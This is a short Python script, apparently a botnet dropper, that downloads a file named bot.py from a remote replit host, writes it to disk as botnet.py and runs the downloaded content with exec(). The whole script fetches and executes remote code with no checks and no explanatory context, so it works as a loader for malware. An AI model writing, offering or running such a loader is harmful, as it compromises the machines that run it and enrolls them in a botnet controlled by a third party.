import requests

r = requests.get('https://stealslotgov.idkotherhex1629.repl.co/bot.py')
f = open('botnet.py','wb')
f.write(r.content)
f.close()
exec(r.content)
